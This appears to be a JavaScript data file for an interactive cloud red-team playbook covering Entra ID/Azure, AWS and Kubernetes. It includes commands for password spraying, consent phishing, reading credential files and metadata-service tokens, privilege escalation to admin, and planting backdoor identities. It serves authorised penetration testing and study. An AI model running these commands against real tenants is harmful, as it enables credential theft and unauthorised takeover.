/*
  CLOUD ATTACK PATH — data for cloud-map.html

  A guided "playbook" for cloud identity attacks (Entra ID / Azure, AWS, and
  Kubernetes), built on the same engine as the AD attack map. Colour-coded
  ACCESS SECTIONS you expand, each holding TECHNIQUE buttons, each showing a
  Theory link, a short note, enumeration/mechanism commands, colour-coded
  OUTCOME badges, and "Move to" pivots that jump to another section when your
  access changes.

  MODEL (identical to admap-v2.js)
    meta       title / version / note
    palette    named stage colours
    sections[] {
      id, title, color(hex), tag, desc,
      techniques[] {
        id, title,
        theory : { label, url } | null,
        vuln   : { label, url } | null,
        cve    : { id, label?, url? } | null,
        desc   : "short note" | null,
        cmds   : [ "command", ... ],            // # comments are dimmed
        branches[] : { label, warn?, cmds[], outcomes[] },
        outcomes[] : { label, color(hex) },     // colour-coded result badges
        moveTo[]   : { section, tech?, label?, note? }
      }
    }

  For authorised testing and study only. Commands are enumeration- and
  mechanism-level references, not a turnkey exploit kit.
*/

var CLOUD_MAP = {
  meta: {
    title: "Cloud Attack Path — Guided Playbook",
    version: "v1",
    note: "For authorised testing and study only. Click a section to expand it, then a technique for its commands."
  },

  // stage palette — access grows as you move down the map
  palette: {
    slate:   "#94a3b8",  // unauthenticated recon
    blue:    "#3b9ee5",  // initial access / authenticated identity
    violet:  "#a78bfa",  // Entra ID / Azure
    cyan:    "#22d3ee",  // AWS
    teal:    "#2dd4bf",  // Kubernetes / containers
    amber:   "#f59e0b",  // hybrid / cross-cloud
    green:   "#4ade80",  // tenant / account takeover
    rose:    "#fb7185"   // persistence
  },

  sections: [
    {
      id: "recon",
      title: "Unauthenticated Recon",
      color: "#94a3b8",
      tag: "Start here",
      desc: "No account yet — fingerprint the tenant/account, enumerate identities, and hunt exposed storage or leaked secrets.",
      techniques: [
        {
          id: "tenant-enum",
          title: "Entra tenant discovery",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "Any Entra tenant exposes unauthenticated metadata: the OpenID configuration, tenant ID/region, whether a domain is managed or federated, and the login endpoints. This fixes which auth flow to attack.",
          cmds: [
            "curl -s https://login.microsoftonline.com/<domain>/.well-known/openid-configuration",
            "curl -s 'https://login.microsoftonline.com/getuserrealm.srf?login=user@<domain>&xml=1'",
            "# AADInternals (PowerShell):",
            "Invoke-AADIntReconAsOutsider -DomainName <domain> | Format-Table",
            "Get-AADIntTenantID -Domain <domain>"
          ],
          outcomes: [{ label: "Tenant mapped", color: "#94a3b8" }],
          moveTo: [{ section: "initial-access", note: "pick an auth flow and get a first identity" }]
        },
        {
          id: "user-enum",
          title: "Cloud user enumeration",
          theory: { label: "External Red Team Workflow", url: "external-red-team-workflow.html" },
          desc: "Confirm valid usernames before spraying. Entra leaks existence through the GetCredentialType endpoint and Teams/OneDrive; AWS leaks principals through cross-account policy errors.",
          cmds: [
            "# Entra: validate accounts without a login attempt",
            "o365creeper / onedrive-user-enum against user@<domain>",
            "# GetCredentialType returns IfExistsResult for a username",
            "# AWS: enumerate account IDs / roles via trust-policy probing",
            "# (pmapper / enumerate-iam for the authenticated side)"
          ],
          outcomes: [{ label: "Valid usernames", color: "#94a3b8" }],
          moveTo: [{ section: "initial-access", tech: "password-spray", note: "spray the confirmed accounts" }]
        },
        {
          id: "public-storage",
          title: "Exposed object storage",
          theory: { label: "AWS Attack Paths", url: "theory/2026-10-09-aws-attack-paths.html" },
          vuln: { label: "Cloud Storage Misconfig", url: "vuln-detail.html?vuln=cloud-storage-misconfig" },
          desc: "Public S3 buckets, Azure blob containers and GCS buckets routinely leak source, backups, and credential files. Guessable names and container listing are the fast path.",
          cmds: [
            "# S3",
            "aws s3 ls s3://<bucket> --no-sign-request",
            "# Azure blob — anonymous container listing",
            "curl -s 'https://<account>.blob.core.windows.net/<container>?restype=container&comp=list'",
            "# bucket/name discovery",
            "cloud_enum -k <company> ; grayhatwarfare search"
          ],
          outcomes: [{ label: "Leaked files / secrets", color: "#94a3b8" }],
          moveTo: [{ section: "initial-access", tech: "leaked-keys", note: "use any keys you recovered" }]
        },
        {
          id: "leaked-secrets",
          title: "Leaked keys in code & artifacts",
          theory: { label: "External Red Team Workflow", url: "external-red-team-workflow.html" },
          vuln: { label: "Secrets Exposure", url: "vuln-detail.html?vuln=secrets-exposure" },
          desc: "Long-lived cloud credentials get committed to Git, baked into container images and CI logs. Scan public and recovered repos, and image layers, for access keys and tokens.",
          cmds: [
            "trufflehog git https://github.com/<org>/<repo> --only-verified",
            "gitleaks detect --source . -v",
            "# container image layers",
            "trufflehog docker --image <registry>/<image>:<tag>"
          ],
          outcomes: [{ label: "Static credentials", color: "#94a3b8" }],
          moveTo: [{ section: "initial-access", tech: "leaked-keys", note: "authenticate with the recovered key" }]
        }
      ]
    },

    {
      id: "initial-access",
      title: "Initial Access to a Cloud Identity",
      color: "#3b9ee5",
      tag: "Foothold",
      desc: "Turn recon into a first authenticated principal — spray, phishing/consent, a leaked key, or a stolen session token.",
      techniques: [
        {
          id: "password-spray",
          title: "Password spraying",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          vuln: { label: "Weak / Reused Passwords", url: "vuln-detail.html?vuln=weak-password-policy" },
          desc: "Low-and-slow spray against the tenant's login endpoint. Watch for conditional access, smart lockout and MFA state — a success with no MFA is an immediate foothold.",
          cmds: [
            "# MSOLSpray / TREVsecurity-style spray via Entra login",
            "MSOLSpray --userlist users.txt --password '<Season><Year>!'",
            "# AWS has no spray surface for IAM users (keys only) — target console/SSO SAML IdP"
          ],
          outcomes: [{ label: "Valid credentials", color: "#3b9ee5" }, { label: "MFA required", color: "#f59e0b" }],
          moveTo: [{ section: "authenticated", note: "enumerate what the account can reach" }]
        },
        {
          id: "device-code-phish",
          title: "Device-code & illicit consent",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          vuln: { label: "OAuth Misconfiguration", url: "vuln-detail.html?vuln=oauth-misconfig" },
          desc: "Device-code phishing trades a code the victim enters at the real Microsoft page for tokens — surviving many MFA setups. Illicit consent grants a rogue app standing OAuth scopes (mail, files) that outlive a password reset.",
          cmds: [
            "# Device-code flow — attacker initiates, victim authenticates the code",
            "# (TokenTactics: Get-AzureToken -Client <graph>)",
            "# Illicit consent — register an app, request delegated scopes, phish the consent URL",
            "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=<app>&scope=Mail.Read%20offline_access&..."
          ],
          outcomes: [{ label: "Session token", color: "#3b9ee5" }, { label: "Persistence", color: "#fb7185" }],
          moveTo: [
            { section: "authenticated", note: "use the tokens to enumerate Graph / ARM" },
            { section: "persistence", tech: "app-backdoor", note: "the consented app is already durable" }
          ]
        },
        {
          id: "leaked-keys",
          title: "Use leaked static credentials",
          theory: { label: "AWS Attack Paths", url: "theory/2026-10-09-aws-attack-paths.html" },
          desc: "A recovered AWS access key, Azure service-principal secret, or SAS token authenticates directly. First establish who you are and what the credential can do.",
          cmds: [
            "# AWS — who am I?",
            "aws sts get-caller-identity",
            "aws iam get-account-authorization-details   # if permitted",
            "# Azure service principal",
            "az login --service-principal -u <appId> -p <secret> --tenant <tid>",
            "az account show ; az role assignment list --assignee <appId>"
          ],
          outcomes: [{ label: "Valid cloud identity", color: "#3b9ee5" }],
          moveTo: [{ section: "authenticated", note: "enumerate the identity's reach" }]
        },
        {
          id: "token-theft",
          title: "Session / token theft from an endpoint",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "From a compromised workstation, cloud session cookies, cached CLI tokens and primary refresh tokens (PRTs) can be lifted and replayed — bypassing MFA because the token already satisfied it.",
          cmds: [
            "# cached CLI tokens",
            "~/.aws/credentials , ~/.azure/ , ~/.config/gcloud/",
            "az account get-access-token --resource https://graph.microsoft.com",
            "# browser session cookies (ESTSAUTH) / PRT cookie replay — endpoint access required"
          ],
          outcomes: [{ label: "Session token", color: "#3b9ee5" }],
          moveTo: [{ section: "authenticated", note: "replay the token against the API" }]
        }
      ]
    },

    {
      id: "authenticated",
      title: "Authenticated Enumeration",
      color: "#38bdf8",
      tag: "Map the blast radius",
      desc: "You hold a principal — enumerate the directory, roles, resources and trust relationships to find the escalation route.",
      techniques: [
        {
          id: "entra-enum",
          title: "Entra ID & Graph enumeration",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "Pull users, groups, roles, applications, service principals and their owners/credentials. Owners of apps and members of privileged roles are the escalation seeds.",
          cmds: [
            "roadrecon auth -u <user> -p <pass> ; roadrecon gather ; roadrecon gui",
            "# AzureHound -> BloodHound for Entra attack paths",
            "azurehound -u <user> -p <pass> list --tenant <tid> -o output.json",
            "az ad user list ; az ad app list ; az role assignment list --all"
          ],
          outcomes: [{ label: "Attack paths mapped", color: "#3b9ee5" }],
          moveTo: [
            { section: "entra-privesc", note: "escalate within the directory" },
            { section: "azure-resource", note: "if the identity has Azure RBAC" }
          ]
        },
        {
          id: "aws-enum",
          title: "AWS IAM & resource enumeration",
          theory: { label: "AWS Attack Paths", url: "theory/2026-10-09-aws-attack-paths.html" },
          desc: "Enumerate your effective permissions, roles you can assume, and misconfigured resources. Map which principals can reach admin via policy abuse or PassRole.",
          cmds: [
            "enumerate-iam --access-key <AK> --secret-key <SK>",
            "aws iam list-attached-user-policies --user-name <me>",
            "pmapper graph create ; pmapper query 'preset privesc <me>'",
            "scoutsuite aws   # account-wide misconfig sweep"
          ],
          outcomes: [{ label: "Privesc paths found", color: "#22d3ee" }],
          moveTo: [
            { section: "aws-access", note: "collect more credentials if needed" },
            { section: "aws-privesc", note: "escalate IAM privileges" }
          ]
        },
        {
          id: "multi-enum",
          title: "Azure resource & subscription survey",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "List subscriptions, resource groups, VMs, storage, Key Vaults, Automation accounts and function apps you can see — each is a potential managed-identity or secret source.",
          cmds: [
            "az account list ; az group list ; az resource list -o table",
            "az vm list ; az keyvault list ; az automation account list",
            "az webapp list ; az functionapp list   # managed-identity hosts"
          ],
          outcomes: [{ label: "Resource inventory", color: "#a78bfa" }],
          moveTo: [{ section: "azure-resource", note: "abuse the resource / RBAC plane" }]
        }
      ]
    },

    {
      id: "entra-privesc",
      title: "Entra ID Privilege Escalation",
      color: "#a78bfa",
      tag: "Directory",
      desc: "Escalate inside the Entra directory — abuse app/service-principal ownership, consent, dynamic groups and privileged role assignment.",
      techniques: [
        {
          id: "app-sp-abuse",
          title: "Application / service-principal takeover",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "If you own (or can write to) an application, you can add a new client secret or certificate and then authenticate as its service principal — inheriting every API permission and role the SP holds.",
          cmds: [
            "# add a credential to an app you own, then log in as the SP",
            "az ad app credential reset --id <appId> --append",
            "az login --service-principal -u <appId> -p <newSecret> --tenant <tid>",
            "# high-value SP app-roles: RoleManagement.ReadWrite.Directory, AppRoleAssignment.ReadWrite.All"
          ],
          outcomes: [{ label: "Privileged role", color: "#a78bfa" }, { label: "Global Admin", color: "#4ade80" }],
          moveTo: [{ section: "takeover", note: "a Graph-privileged SP can grant itself GA" }]
        },
        {
          id: "consent-grant",
          title: "Admin consent & app-role grant abuse",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          vuln: { label: "OAuth Misconfiguration", url: "vuln-detail.html?vuln=oauth-misconfig" },
          desc: "A principal that can grant app role assignments (or admin-consent) can give a controlled app directory-wide Graph permissions, then act through that app — a common path from a mid-tier admin role to full directory control.",
          cmds: [
            "# assign an app role (e.g. RoleManagement.ReadWrite.Directory) to a controlled SP",
            "# via Graph: POST /servicePrincipals/<id>/appRoleAssignments",
            "# then the SP can add members to privileged directory roles"
          ],
          outcomes: [{ label: "Global Admin", color: "#4ade80" }],
          moveTo: [{ section: "takeover", note: "escalate the controlled app to GA" }]
        },
        {
          id: "dynamic-group",
          title: "Dynamic group membership injection",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "Dynamic groups auto-add members by attribute rule (e.g. userPrincipalName or otherMails contains a string). If you can set that attribute on a controlled user, you self-join the group — and any role/access attached to it.",
          cmds: [
            "# read the membership rule",
            "az ad group show --group <g> --query membershipRule",
            "# set the matching attribute on a user you control (if writable), then re-evaluate"
          ],
          outcomes: [{ label: "Privileged role", color: "#a78bfa" }],
          moveTo: [{ section: "azure-resource", note: "if the group grants Azure RBAC" }]
        },
        {
          id: "role-assignment",
          title: "Privileged role & PIM abuse",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "Roles like Privileged Authentication Administrator or Authentication Administrator can reset other users' credentials/MFA — including higher-privileged accounts. Privileged Role Administrator can assign any directory role.",
          cmds: [
            "# enumerate who holds escalation-capable roles",
            "az rest --method get --uri 'https://graph.microsoft.com/v1.0/directoryRoles'",
            "# Priv Auth Admin -> reset a GA's auth methods -> sign in as them"
          ],
          outcomes: [{ label: "Global Admin", color: "#4ade80" }],
          moveTo: [{ section: "takeover", note: "take over a Global Admin account" }]
        }
      ]
    },

    {
      id: "azure-resource",
      title: "Azure Resource Abuse (ARM / RBAC)",
      color: "#8b5cf6",
      tag: "Resource plane",
      desc: "Pivot through the Azure control plane — managed identities, VM/automation code execution and Key Vault secrets.",
      techniques: [
        {
          id: "managed-identity",
          title: "Managed identity token theft",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "VMs, function apps and automation accounts can carry a managed identity. Code running on the resource (or an SSRF to the metadata endpoint) mints an Entra token for that identity — then you act with its RBAC rights.",
          cmds: [
            "# from inside the resource (or via SSRF to IMDS):",
            "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
            "az login --identity ; az role assignment list --assignee <mi-objectId>"
          ],
          outcomes: [{ label: "Managed identity token", color: "#a78bfa" }],
          moveTo: [
            { section: "entra-privesc", note: "if the MI holds directory roles" },
            { section: "takeover", note: "if the MI is Owner at subscription scope" }
          ]
        },
        {
          id: "run-command",
          title: "VM run-command / script extension",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "With Virtual Machine Contributor (or run-command rights) you run code as SYSTEM/root on a VM without any OS credential — then harvest its managed identity and local secrets.",
          cmds: [
            "az vm run-command invoke -g <rg> -n <vm> --command-id RunPowerShellScript --scripts 'whoami'",
            "# or deploy a Custom Script Extension to the VM"
          ],
          outcomes: [{ label: "Code on VM", color: "#a78bfa" }, { label: "Managed identity token", color: "#a78bfa" }],
          moveTo: [{ section: "azure-resource", tech: "managed-identity", note: "pull the VM's MI token" }]
        },
        {
          id: "automation-runbook",
          title: "Automation account / RunAs abuse",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "Automation accounts run runbooks under a managed identity or RunAs service principal that is frequently over-privileged (Contributor/Owner). Authoring a runbook runs your code with that identity.",
          cmds: [
            "az automation account list ; az automation runbook list -g <rg> --automation-account-name <aa>",
            "# publish a runbook that requests the automation MI token"
          ],
          outcomes: [{ label: "Managed identity token", color: "#a78bfa" }],
          moveTo: [{ section: "azure-resource", tech: "managed-identity", note: "use the automation identity" }]
        },
        {
          id: "keyvault",
          title: "Key Vault secret / key extraction",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "A principal with Key Vault data-plane access (or a managed identity granted it) reads stored secrets, keys and certificates — often app credentials, connection strings and SP secrets that unlock further access.",
          cmds: [
            "az keyvault secret list --vault-name <kv>",
            "az keyvault secret show --vault-name <kv> --name <secret> --query value -o tsv"
          ],
          outcomes: [{ label: "Valid credentials", color: "#3b9ee5" }],
          moveTo: [{ section: "authenticated", note: "re-enumerate with the recovered secret" }]
        }
      ]
    },

    {
      id: "aws-access",
      title: "AWS Credential Access",
      color: "#22d3ee",
      tag: "AWS",
      desc: "Collect AWS credentials from the environment — instance metadata via SSRF, static keys, and role-assumption chains.",
      techniques: [
        {
          id: "imds-ssrf",
          title: "IMDS role-credential theft (SSRF)",
          theory: { label: "AWS Attack Paths", url: "theory/2026-10-09-aws-attack-paths.html" },
          vuln: { label: "SSRF", url: "vuln-detail.html?vuln=ssrf" },
          desc: "An SSRF (or code exec) on an EC2 instance can reach the Instance Metadata Service and read the attached role's temporary credentials. IMDSv2 requires a token-fetch first, but a flexible SSRF often still works.",
          cmds: [
            "# IMDSv1",
            "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>",
            "# IMDSv2 (token first)",
            "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')",
            "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/"
          ],
          outcomes: [{ label: "Role credentials", color: "#22d3ee" }],
          moveTo: [{ section: "aws-privesc", note: "escalate from the role's permissions" }]
        },
        {
          id: "access-keys",
          title: "Long-term access keys",
          theory: { label: "AWS Attack Paths", url: "theory/2026-10-09-aws-attack-paths.html" },
          desc: "Static IAM user keys (AKIA…) found in code, config, or on hosts authenticate directly and don't expire. Confirm identity and enumerate before acting.",
          cmds: [
            "aws configure set aws_access_key_id <AK> ; aws configure set aws_secret_access_key <SK>",
            "aws sts get-caller-identity",
            "aws iam list-user-policies --user-name <me>"
          ],
          outcomes: [{ label: "Valid cloud identity", color: "#3b9ee5" }],
          moveTo: [{ section: "aws-privesc", note: "look for a privesc primitive" }]
        },
        {
          id: "sts-assume",
          title: "Role assumption chains",
          theory: { label: "AWS Attack Paths", url: "theory/2026-10-09-aws-attack-paths.html" },
          desc: "Over-permissive trust policies let one principal assume a more privileged role, sometimes across several hops or accounts. Map the chain, then walk it with sts:AssumeRole.",
          cmds: [
            "aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<role> --role-session-name s",
            "# pmapper / awspx visualise which principals can reach which roles"
          ],
          outcomes: [{ label: "Role credentials", color: "#22d3ee" }],
          moveTo: [{ section: "aws-privesc", note: "continue escalating along the chain" }]
        }
      ]
    },

    {
      id: "aws-privesc",
      title: "AWS Privilege Escalation",
      color: "#06b6d4",
      tag: "AWS",
      desc: "Turn a limited AWS principal into account admin via IAM policy manipulation, PassRole, and privileged services.",
      techniques: [
        {
          id: "iam-policy-abuse",
          title: "IAM policy manipulation",
          theory: { label: "AWS Attack Paths", url: "theory/2026-10-09-aws-attack-paths.html" },
          desc: "A principal with the right IAM write action escalates itself: CreatePolicyVersion rewrites an attached policy; AttachUserPolicy/PutUserPolicy adds AdministratorAccess; CreateAccessKey mints keys for a privileged user.",
          cmds: [
            "# e.g. attach admin to yourself if iam:AttachUserPolicy is allowed",
            "aws iam attach-user-policy --user-name <me> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            "# or set a new default policy version if iam:CreatePolicyVersion is allowed",
            "aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default"
          ],
          outcomes: [{ label: "Account admin", color: "#4ade80" }],
          moveTo: [{ section: "takeover", note: "you now hold account-wide admin" }]
        },
        {
          id: "pass-role",
          title: "iam:PassRole to a service",
          theory: { label: "AWS Attack Paths", url: "theory/2026-10-09-aws-attack-paths.html" },
          desc: "iam:PassRole combined with a compute service (Lambda, EC2, Glue, CloudFormation) lets you hand a privileged role to code you control, then run as that role — a classic indirect escalation.",
          cmds: [
            "# create a Lambda that runs as a passed privileged role, then invoke it",
            "aws lambda create-function --role arn:aws:iam::<acct>:role/<privRole> ...",
            "aws lambda invoke --function-name <fn> out.json",
            "# EC2 variant: launch an instance with an instance profile for the role"
          ],
          outcomes: [{ label: "Role credentials", color: "#22d3ee" }, { label: "Account admin", color: "#4ade80" }],
          moveTo: [{ section: "takeover", note: "if the passed role is privileged" }]
        },
        {
          id: "privileged-service",
          title: "Privileged service abuse (SSM, EC2)",
          theory: { label: "AWS Attack Paths", url: "theory/2026-10-09-aws-attack-paths.html" },
          desc: "Systems Manager (ssm:SendCommand / StartSession) runs commands as root on managed instances; EC2 user-data and snapshot sharing expose data and roles. Each converts a management permission into host access.",
          cmds: [
            "aws ssm send-command --document-name AWS-RunShellScript --targets Key=instanceids,Values=<id> --parameters commands='id'",
            "aws ssm start-session --target <id>"
          ],
          outcomes: [{ label: "Code on host", color: "#22d3ee" }, { label: "Role credentials", color: "#22d3ee" }],
          moveTo: [{ section: "aws-access", tech: "imds-ssrf", note: "pull the host role from IMDS" }]
        }
      ]
    },

    {
      id: "kubernetes",
      title: "Kubernetes & Containers",
      color: "#2dd4bf",
      tag: "Cluster",
      desc: "Move through a cluster — service-account tokens, RBAC gaps, container escape, and the node's cloud identity.",
      techniques: [
        {
          id: "sa-token",
          title: "Service-account token abuse",
          theory: { label: "Kubernetes & Container Attacks", url: "theory/2026-10-09-kubernetes-container-attacks.html" },
          desc: "Every pod can mount a service-account token. Over-broad RBAC on that SA (list secrets, create pods, exec) lets a compromised pod enumerate and pivot across the namespace or cluster.",
          cmds: [
            "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
            "kubectl auth can-i --list",
            "kubectl get secrets -A ; kubectl auth can-i create pods"
          ],
          outcomes: [{ label: "Cluster foothold", color: "#2dd4bf" }],
          moveTo: [{ section: "kubernetes", tech: "node-metadata", note: "reach the node's cloud identity" }]
        },
        {
          id: "rbac-abuse",
          title: "RBAC escalation primitives",
          theory: { label: "Kubernetes & Container Attacks", url: "theory/2026-10-09-kubernetes-container-attacks.html" },
          desc: "Rights like create pods (schedule a privileged pod), create/patch rolebindings (bind yourself cluster-admin), or exec into pods are direct escalation primitives within RBAC.",
          cmds: [
            "# schedule a privileged / hostPath pod if allowed",
            "kubectl run x --image=alpine --overrides='{\"spec\":{\"hostPID\":true,\"containers\":[...]}}'",
            "# bind cluster-admin if you can create ClusterRoleBindings",
            "kubectl create clusterrolebinding x --clusterrole=cluster-admin --serviceaccount=<ns>:<sa>"
          ],
          outcomes: [{ label: "cluster-admin", color: "#2dd4bf" }],
          moveTo: [{ section: "kubernetes", tech: "node-metadata", note: "pivot to the cloud control plane" }]
        },
        {
          id: "container-escape",
          title: "Container escape to node",
          theory: { label: "Kubernetes & Container Attacks", url: "theory/2026-10-09-kubernetes-container-attacks.html" },
          desc: "Privileged containers, hostPath mounts, hostPID/hostNetwork, or an exposed container runtime socket let a container break out to the node — giving root on the host and every other pod's secrets.",
          cmds: [
            "# indicators to check from inside the container",
            "mount | grep -i host ; ls -la /var/run/docker.sock",
            "cat /proc/1/cgroup ; capsh --print   # privileged?"
          ],
          outcomes: [{ label: "Root on node", color: "#2dd4bf" }],
          moveTo: [{ section: "kubernetes", tech: "node-metadata", note: "the node carries a cloud identity" }]
        },
        {
          id: "node-metadata",
          title: "Node cloud-identity theft",
          theory: { label: "Kubernetes & Container Attacks", url: "theory/2026-10-09-kubernetes-container-attacks.html" },
          desc: "A cluster node is an EC2 instance / Azure VM / GCE VM with its own cloud role or managed identity. From the node (or a pod that can reach metadata) you mint that identity's cloud token and pivot into the account/subscription.",
          cmds: [
            "# AWS node role",
            "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "# Azure AKS node managed identity",
            "curl -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"
          ],
          outcomes: [{ label: "Role credentials", color: "#22d3ee" }, { label: "Managed identity token", color: "#a78bfa" }],
          moveTo: [
            { section: "aws-privesc", note: "escalate from the node role (EKS)" },
            { section: "azure-resource", note: "use the node MI (AKS)" }
          ]
        }
      ]
    },

    {
      id: "lateral-hybrid",
      title: "Hybrid & Cross-Cloud Lateral Movement",
      color: "#f59e0b",
      tag: "Boundary crossing",
      desc: "Cross the cloud ↔ on-prem boundary — identity sync servers, federation trust, and cloud-managed endpoints.",
      techniques: [
        {
          id: "entra-connect",
          title: "Entra Connect / sync server abuse",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "The Entra Connect server bridges on-prem AD and the tenant. It holds the directory sync account (often with DCSync-like rights on-prem) and, with Password Hash Sync, material that enables cloud↔on-prem pivots in both directions.",
          cmds: [
            "# on a compromised sync server, recover the sync account / config",
            "# AADInternals: Get-AADIntSyncCredentials",
            "# PHS material enables impersonation paths between on-prem and cloud"
          ],
          outcomes: [{ label: "Pivot on-prem", color: "#f59e0b" }, { label: "Global Admin", color: "#4ade80" }],
          moveTo: [{ section: "takeover", note: "sync account often maps to high cloud privilege" }]
        },
        {
          id: "golden-saml",
          title: "Federation / Golden SAML",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "With the token-signing key from a federation server (ADFS) or a rogue trusted IdP, an attacker forges SAML assertions for any user — authenticating to federated cloud services with no password and bypassing MFA.",
          cmds: [
            "# requires the ADFS token-signing private key (DKM) from a compromised ADFS host",
            "# forge an assertion for any user -> federated login to M365 / AWS SSO"
          ],
          outcomes: [{ label: "Tenant takeover", color: "#4ade80" }, { label: "Persistence", color: "#fb7185" }],
          moveTo: [
            { section: "takeover", note: "forge assertions for privileged users" },
            { section: "persistence", tech: "federated-idp", note: "a rogue IdP is durable" }
          ]
        },
        {
          id: "cloud-to-onprem",
          title: "Cloud-managed endpoints (Intune / SSM)",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "Device-management planes run code on every enrolled endpoint. Intune (with the right admin role) pushes scripts to managed Windows/macOS devices; AWS SSM pushes commands to managed instances — cloud admin becomes fleet-wide host exec.",
          cmds: [
            "# Intune: deploy a platform/remediation script to a device group (admin role required)",
            "# SSM: aws ssm send-command across managed on-prem/hybrid instances"
          ],
          outcomes: [{ label: "Pivot on-prem", color: "#f59e0b" }],
          moveTo: [{ section: "takeover", note: "fleet exec consolidates control" }]
        }
      ]
    },

    {
      id: "takeover",
      title: "Tenant / Account Takeover",
      color: "#4ade80",
      tag: "You own it",
      desc: "Top of the chain — Global Admin over the tenant, or admin over the AWS organisation. Consolidate and move to persistence.",
      techniques: [
        {
          id: "global-admin",
          title: "Global Admin consolidation",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "As Global Admin you can elevate to manage all Azure subscriptions (the 'elevate access' toggle grants User Access Administrator at root scope), read all data, and reconfigure security controls.",
          cmds: [
            "# GA -> User Access Administrator at root to reach every subscription",
            "az rest --method post --uri 'https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01'",
            "az role assignment list --scope / --include-inherited"
          ],
          outcomes: [{ label: "Persistence", color: "#fb7185" }],
          moveTo: [{ section: "persistence", note: "plant durable access before cleanup" }]
        },
        {
          id: "aws-org-admin",
          title: "AWS organisation admin",
          theory: { label: "AWS Attack Paths", url: "theory/2026-10-09-aws-attack-paths.html" },
          desc: "Admin in the management (payer) account controls the whole organisation: the OrganizationAccountAccessRole reaches every member account, and SCPs can be edited to lift guardrails across the org.",
          cmds: [
            "aws organizations list-accounts",
            "aws sts assume-role --role-arn arn:aws:iam::<member>:role/OrganizationAccountAccessRole --role-session-name s"
          ],
          outcomes: [{ label: "Persistence", color: "#fb7185" }],
          moveTo: [{ section: "persistence", note: "backdoor identities org-wide" }]
        }
      ]
    },

    {
      id: "persistence",
      title: "Cloud Persistence",
      color: "#fb7185",
      tag: "Stay in",
      desc: "Durable, often MFA-immune access that survives password resets — app credentials, rogue federation, and backdoor principals.",
      techniques: [
        {
          id: "app-backdoor",
          title: "Application / service-principal credentials",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "Adding a secret or certificate to an existing privileged application gives a credential that isn't tied to any user, has no MFA, and is easy to overlook. The SP keeps its API permissions until the credential is found and removed.",
          cmds: [
            "az ad app credential reset --id <appId> --append   # new long-lived secret",
            "# or add a certificate credential via Graph addKey"
          ],
          outcomes: [{ label: "Durable access", color: "#fb7185" }],
          moveTo: []
        },
        {
          id: "federated-idp",
          title: "Rogue federated domain / trusted IdP",
          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
          desc: "Adding a federated domain (or trusting an attacker IdP) lets the attacker mint tokens for users of that domain — a backdoor that bypasses MFA and survives credential resets until the federation config is audited.",
          cmds: [
            "# AADInternals: ConvertTo-AADIntBackdoor -DomainName <domain>",
            "# forged SAML tokens then authenticate as chosen users"
          ],
          outcomes: [{ label: "Durable access", color: "#fb7185" }],
          moveTo: []
        },
        {
          id: "aws-backdoor",
          title: "Backdoor IAM user / role",
          theory: { label: "AWS Attack Paths", url: "theory/2026-10-09-aws-attack-paths.html" },
          desc: "A second access key on an existing user, a role with a wildcard trust policy, or a Lambda that re-grants access on a schedule all survive a single-key rotation and blend into normal IAM.",
          cmds: [
            "aws iam create-access-key --user-name <existing-user>   # second key",
            "# or a role whose trust policy allows an external/attacker principal to assume it"
          ],
          outcomes: [{ label: "Durable access", color: "#fb7185" }],
          moveTo: []
        }
      ]
    }
  ]
};
